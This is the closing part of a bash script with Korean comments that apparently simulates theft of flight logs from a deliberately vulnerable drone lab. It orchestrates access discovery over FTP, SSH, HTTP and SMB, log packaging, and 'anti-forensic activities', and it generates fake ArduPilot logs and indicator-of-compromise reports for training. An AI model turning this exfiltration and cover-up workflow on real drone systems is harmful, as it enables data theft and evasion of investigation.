        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD Flight Logs Exfiltration Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    local total_files_extracted=0
    
    echo -e "${BOLD}${BLUE}🗂️ Starting Flight Logs Exfiltration...${NC}"
    echo ""
    
    # 1. 탈취 환경 준비
    if ! prepare_exfiltration_environment; then
        echo -e "${RED}[!] Failed to prepare exfiltration environment${NC}"
        exit 1
    fi
    
    # 2. 접근 방법 탐지
    echo ""
    echo -e "${BOLD}${CYAN}🔍 Discovering Access Methods...${NC}"
    if ! discover_access_methods; then
        echo -e "${YELLOW}[*] Using simulated extraction for demonstration${NC}"
        echo "EXFIL_SIMULATION:DEMO_MODE" >> "$IOC_FILE"
        
        # 시뮬레이션된 로그 파일 생성
        simulate_log_files
    fi
    
    # 3. 로그 파일 분석
    echo ""
    echo -e "${BOLD}${YELLOW}📊 Analyzing Extracted Logs...${NC}"
    analyze_extracted_logs
    
    # 4. 데이터 패키징
    echo ""
    echo -e "${BOLD}${GREEN}📦 Packaging Extracted Data...${NC}"
    package_extracted_logs
    
    # 5. 안티포렌식 활동
    echo ""
    echo -e "${BOLD}${RED}🧹 Anti-Forensic Activities...${NC}"
    simulate_anti_forensics
    
    local end_time=$(date +%s)
    
    # 추출된 총 파일 수 계산
    if [ -d "$EXFIL_SESSION_DIR" ]; then
        total_files_extracted=$(find "$EXFIL_SESSION_DIR" -name "*.bin" -o -name "*.tlog" -o -name "*.log" -o -name "*.param" | wc -l)
    fi
    
    echo ""
    echo -e "${BOLD}${GREEN}🗂️ Flight Logs Exfiltration Completed!${NC}"
    echo ""
    echo -e "${GREEN}📈 Exfiltration Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Files Extracted: ${total_files_extracted}"
    echo "   • Access Methods Used: Multiple (FTP, SSH, HTTP, SMB)"
    echo "   • Session Directory: $(basename "$EXFIL_SESSION_DIR")"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    echo "   • Extracted Data: ${EXFIL_SESSION_DIR}"
    echo ""
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time" "$total_files_extracted"
    
    echo -e "${YELLOW}💡 Intelligence Value:${NC}"
    echo "   1. Flight path reconstruction from binary logs"
    echo "   2. System configuration analysis from parameters"
    echo "   3. Operational patterns from telemetry data"
    echo "   4. Incident analysis from crash dumps"
    echo ""
    
    # IOCs 요약 출력
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
    
    # 데이터 요약
    if [ -d "$EXFIL_SESSION_DIR" ]; then
        local session_size=$(du -sh "$EXFIL_SESSION_DIR" 2>/dev/null | cut -f1 || echo "Unknown")
        local binary_logs=$(find "$EXFIL_SESSION_DIR" -name "*.bin" | wc -l)
        local telemetry_logs=$(find "$EXFIL_SESSION_DIR" -name "*.tlog" | wc -l)
        local param_files=$(find "$EXFIL_SESSION_DIR" -name "*.param" | wc -l)
        
        echo -e "${BOLD}${GREEN}📊 Extracted Data Breakdown:${NC}"
        echo "   • Binary Logs: ${binary_logs}"
        echo "   • Telemetry Logs: ${telemetry_logs}"
        echo "   • Parameter Files: ${param_files}"
        echo "   • Total Size: ${session_size}"
        echo ""
    fi
}

# 시뮬레이션된 로그 파일 생성 (데모용)
simulate_log_files() {
    echo -e "${YELLOW}[+] Creating simulated log files for demonstration...${NC}" | tee -a "$LOG_FILE"
    
    local sim_dir="${EXFIL_SESSION_DIR}/simulated_logs"
    mkdir -p "$sim_dir"
    
    # 가짜 ArduPilot 바이너리 로그
    dd if=/dev/urandom of="${sim_dir}/flight_log_$(date +%Y%m%d_%H%M%S).bin" bs=1K count=100 2>/dev/null
    
    # 가짜 텔레메트리 로그
    echo -e "MAVLink telemetry data simulation\nTimestamp: $(date)\nGPS: 37.5665,126.9780\nAltitude: 120m" > "${sim_dir}/telemetry_$(date +%Y%m%d_%H%M%S).tlog"
    
    # 가짜 파라미터 파일
    cat > "${sim_dir}/parameters_$(date +%Y%m%d_%H%M%S).param" << EOF
AHRS_ORIENTATION,0
BATT_MONITOR,4  
COMPASS_ENABLE,1
GPS_TYPE,1
RC1_MAX,2000
RC1_MIN,1000
WPNAV_SPEED,500
EOF
    
    # 가짜 미션 파일
    cat > "${sim_dir}/mission_$(date +%Y%m%d_%H%M%S).waypoints" << EOF
QGC WPL 110
0	1	0	16	0	0	0	0	37.566500	126.978000	50.000000	1
1	0	0	16	0	0	0	0	37.567000	126.979000	100.000000	1
2	0	0	16	0	0	0	0	37.567500	126.980000	100.000000	1
EOF
    
    local sim_files=$(find "$sim_dir" -type f | wc -l)
    echo -e "${GREEN}[✓] Created ${sim_files} simulated log files${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_SIMULATION:CREATED_${sim_files}_FILES" >> "$IOC_FILE"
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up exfiltration processes...${NC}"
    # 백그라운드 프로세스 종료
    jobs -p | xargs -r kill 2>/dev/null
    # 임시 파일 정리
    rm -f /tmp/fake_log_*.log 2>/dev/null
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"